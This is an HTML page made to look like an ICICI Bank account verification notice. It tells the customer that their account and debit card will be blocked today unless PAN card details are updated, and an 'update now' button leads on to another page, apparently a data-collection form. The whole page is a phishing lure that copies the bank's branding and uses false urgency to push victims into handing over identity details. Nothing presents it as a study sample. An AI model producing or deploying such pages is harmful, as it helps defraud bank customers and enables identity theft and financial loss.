<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ICICI Bank - Account Verification Notice</title>
    <style>
        body {
            font-family: 'Roboto', 'Arial', sans-serif;
            background: linear-gradient(135deg, #f0f0f0, #d9e2f3);
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 83vh;
            overflow: hidden;
        }
        .container {
            background-color: #fff;
            width: 100%;
            max-width: 500px;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.15);
            text-align: center;
            border: 1px solid #e0e0e0;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
            height: 80vh;
            max-height: 600px;
        }
        .header img {
            max-width: 265px;
            filter: drop-shadow(0 2px 4px rgba(0, 0, 0, 0.2));
        }
        .content {
            padding: 15px;
            flex-grow: 1;
            display: flex;
            flex-direction: column;
            justify-content: center;
        }
        .content h2 {
            color: #222;
            font-size: 20px;
            margin-bottom: 10px;
            font-weight: 700;
        }
        .notification {
            background-color: #fff8dc;
            padding: 10px;
            border: 1px solid #eee;
            border-radius: 6px;
            margin-bottom: 15px;
        }
        .notification p {
            color: #444;
            line-height: 1.5;
            font-size: 14px;
            margin: 0;
        }
        .content p {
            color: #444;
            line-height: 1.5;
            font-size: 14px;
            margin-bottom: 15px;
        }
        .btn {
            background: linear-gradient(45deg, #f69312, #ffaa33);
            color: #fff;
            padding: 8px 16px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 14px;
            font-family: 'Roboto', Arial, sans-serif;
            font-weight: 600;
            text-transform: uppercase;
            transition: all 0.3s ease;
            box-shadow: 0 3px 8px rgba(246, 147, 18, 0.4);
            display: inline-flex;
            align-items: center;
            gap: 6px;
        }
        .btn::before {
            content: '\f061';
            font-family: 'Font Awesome 5 Free';
            font-weight: 900;
            font-size: 12px;
        }
        .btn:hover {
            background: linear-gradient(45deg, #d98210, #ff9933);
            transform: scale(1.05);
            box-shadow: 0 4px 12px rgba(246, 147, 18, 0.6);
        }
        .btn:active {
            transform: scale(0.95);
            box-shadow: 0 2px 6px rgba(246, 147, 18, 0.3);
        }
        .footer {
            margin-top: 15px;
            font-size: 12px;
            color: #666;
            line-height: 1.4;
        }
        .footer a {
            color: #0059b3;
            text-decoration: none;
            transition: color 0.3s ease;
        }
        .footer a:hover {
            color: #003087;
        }
    </style>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
</head>
<body>
    <div class="container">
        <div class="header">
            <img src="m h.jpg" alt="ICICI Bank Logo">
        </div>
        <div class="content">
            <h2>Important Account Verification Notice</h2>
            <div class="notification">
                <p>Dear ICICI Bank Customer,</p>
                <p>Your ICICI Bank Account and Debit Card will be blocked today. Please update your PAN Card Details immediately.</p>
            </div>
            <button class="btn" onclick="window.location.href='Main.html'">update now</button>
        </div>
        <div class="footer">
            <p>Â© 2025 ICICI Bank. All rights reserved. For assistance, contact our customer support at <a href="tel:18001080">1800-1080</a>.</p>
        </div>
    </div>
</body>
</html>
